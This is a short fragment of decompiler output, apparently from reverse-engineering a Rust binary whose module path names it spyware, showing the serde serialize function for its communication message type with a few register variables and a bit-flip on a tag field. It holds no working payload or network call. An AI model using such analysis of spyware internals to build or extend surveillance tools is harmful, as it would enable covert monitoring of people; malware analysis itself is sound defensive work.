fn spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::Message>::serialize(a0: i64, a1: i64, a2: i64) -> void {
    let v0: u64;  // [bp-0x8]
    let v2: u64;  // rbx
    let v3: u64;  // rcx

    v0 = v2;
    v3 = 0x8000000000000000 ^ *(a1 as &i64);
}
